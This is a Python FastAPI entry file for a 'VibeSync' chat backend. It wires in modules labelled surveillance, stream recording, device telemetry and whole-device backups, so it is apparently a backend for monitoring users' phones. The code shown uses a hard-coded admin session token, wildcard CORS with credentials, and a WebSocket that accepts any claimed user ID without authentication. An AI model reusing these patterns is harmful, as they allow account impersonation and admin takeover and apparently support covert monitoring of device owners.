import json
import uuid
import time
from fastapi import FastAPI, HTTPException, WebSocket, WebSocketDisconnect
from fastapi.middleware.cors import CORSMiddleware
from fastapi.staticfiles import StaticFiles

try:
    from database import init_db, get_db
    from websocket_manager import ws_manager
    from config import MEDIA_DIR, STATIC_DIR, ADMIN_PASSWORD, logger
    from surveillance import router as surveillance_router
    from user_management import router as user_management_router
    from device_management import router as device_management_router
    from data_management import router as data_management_router
    from chat_calls import router as chat_calls_router
except ImportError:
    from server.database import init_db, get_db
    from server.websocket_manager import ws_manager
    from server.config import MEDIA_DIR, STATIC_DIR, ADMIN_PASSWORD, logger
    from server.surveillance import router as surveillance_router
    from server.user_management import router as user_management_router
    from server.device_management import router as device_management_router
    from server.data_management import router as data_management_router
    from server.chat_calls import router as chat_calls_router

app = FastAPI(
    title="VibeSync Backend API",
    description="Segregated, modular backend API for VibeSync user app and admin dashboard.",
    version="2.0.0"
)

# Enable CORS for cross-platform Android App and Admin Dashboard access
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# Static file mounts
app.mount("/uploads", StaticFiles(directory=MEDIA_DIR), name="uploads")
app.mount("/static", StaticFiles(directory=STATIC_DIR), name="static")

# Mount segregated feature routers
app.include_router(surveillance_router)
app.include_router(user_management_router)
app.include_router(device_management_router)
app.include_router(data_management_router)
app.include_router(chat_calls_router)

# --- SYSTEM & AUTHENTICATION ENDPOINTS ---

@app.on_event("startup")
def startup_event():
    init_db()
    logger.info("Database initialized successfully.")

@app.get("/")
def read_root():
    return {
        "status": "online",
        "service": "VibeSync Enterprise Backend API",
        "version": "2.0.0",
        "modules": [
            "Surveillance & Stream Recording",
            "User Management & Contacts",
            "Device Provisioning & Telemetry",
            "Data Management & Whole-Device Backups",
            "Chat Messaging & WebRTC/Agora Signaling"
        ]
    }

@app.post("/api/admin/login")
def admin_login(data: dict):
    password = data.get("password", "").strip()
    if password == ADMIN_PASSWORD:
        return {
            "status": "success",
            "token": "admin_session_token",
            "message": "Authentication successful"
        }
    raise HTTPException(status_code=401, detail="Invalid admin credentials")

# --- REALTIME WEBSOCKET GATEWAY (Messaging & Call Signaling) ---

@app.websocket("/ws")
async def websocket_endpoint(websocket: WebSocket, user_id: str):
    aliases = [user_id]
    try:
        conn = get_db()
        cursor = conn.cursor()
        clean_u = user_id.lstrip("@").strip()
        cursor.execute("SELECT id, username FROM users WHERE id = ? OR LOWER(username) = LOWER(?)", (clean_u, clean_u))
        u_row = cursor.fetchone()
        if u_row:
            aliases.append(u_row["id"])
            aliases.append(u_row["username"])
            cursor.execute("SELECT device_id FROM devices WHERE user_id = ? OR LOWER(username) = LOWER(?)", (u_row["id"], u_row["username"]))
            for dev in cursor.fetchall():
                if dev["device_id"]:
                    aliases.append(dev["device_id"])
        conn.close()
    except Exception as e:
        logger.warning(f"Error fetching aliases for {user_id}: {e}")

    await ws_manager.connect(user_id, websocket, aliases=aliases)
    try:
        while True:
            data_str = await websocket.receive_text()
            data = json.loads(data_str)
            msg_type = data.get("type")
            
            if msg_type == "CHAT_MESSAGE":
                payload = data.get("payload")
                msg_id = payload.get("id") or str(uuid.uuid4())
                conv_id = payload.get("conversation_id")
                sender_id = user_id
                recipient_id = payload.get("recipient_id")
                message_type = payload.get("message_type", "TEXT")
                content = payload.get("content")
                media_url = payload.get("media_url")
                media_duration = payload.get("media_duration_ms")
                waveform = payload.get("waveform_data")
                now = int(time.time() * 1000)
                
                conn = get_db()
                cursor = conn.cursor()
                if not conv_id:
                    p1, p2 = sorted([sender_id, recipient_id])
                    cursor.execute("SELECT id FROM conversations WHERE participant_one = ? AND participant_two = ?", (p1, p2))
                    c_row = cursor.fetchone()
                    if c_row:
                        conv_id = c_row["id"]
                    else:
                        conv_id = str(uuid.uuid4())
                        cursor.execute("""
                            INSERT INTO conversations (id, participant_one, participant_two, last_message_preview, last_message_time, unread_count)
                            VALUES (?, ?, ?, ?, ?, 0)
                        """, (conv_id, p1, p2, content or "Voice Note", now))
                
                waveform_str = json.dumps(waveform) if waveform else None
                status = "DELIVERED" if ws_manager.is_online(recipient_id) else "SENT"
                
                cursor.execute("""
                    INSERT INTO messages (id, conversation_id, sender_id, recipient_id, message_type, content, media_url, media_duration_ms, waveform_data, status, created_at)
                    VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
                """, (msg_id, conv_id, sender_id, recipient_id, message_type, content, media_url, media_duration, waveform_str, status, now))
                
                preview = "🎤 Voice Note" if message_type == "VOICE_NOTE" else (content or "")
                cursor.execute("""
                    UPDATE conversations
                    SET last_message_preview = ?, last_message_time = ?
                    WHERE id = ?
                """, (preview, now, conv_id))
                conn.commit()
                conn.close()
                
                event = {
                    "type": "NEW_MESSAGE",
                    "payload": {
                        "id": msg_id,
                        "conversation_id": conv_id,
                        "sender_id": sender_id,
                        "recipient_id": recipient_id,
                        "message_type": message_type,
                        "content": content,
                        "media_url": media_url,
                        "media_duration_ms": media_duration,
                        "waveform_data": waveform,
                        "status": status,
                        "created_at": now
                    }
                }
                
                await ws_manager.send_personal_message(event, recipient_id)
                await ws_manager.send_personal_message({
                    "type": "MESSAGE_ACK",
                    "payload": {"id": msg_id, "conversation_id": conv_id, "status": status}
                }, sender_id)
                
            elif msg_type == "TYPING_STATUS":
                recipient_id = data.get("recipient_id")
                is_typing = data.get("is_typing", False)
                await ws_manager.send_personal_message({
                    "type": "TYPING_STATUS",
                    "sender_id": user_id,
                    "is_typing": is_typing
                }, recipient_id)
                
            elif msg_type in ["CALL_INITIATE", "CALL_ACCEPTED", "CALL_REJECTED", "CALL_ENDED", "CALL_OFFER", "CALL_ANSWER", "ICE_CANDIDATE", "CALL_HANGUP"]:
                recipient_id = data.get("recipient_id")
                data["sender_id"] = user_id
                await ws_manager.send_personal_message(data, recipient_id)
                
    except WebSocketDisconnect:
        ws_manager.disconnect(user_id, aliases=aliases)
        await ws_manager.broadcast_user_status(user_id, online=False)

if __name__ == "__main__":
    import uvicorn
    print("Starting VibeSync Backend Server on http://0.0.0.0:8000 ...")
    uvicorn.run("main:app", host="0.0.0.0", port=8000, reload=True)
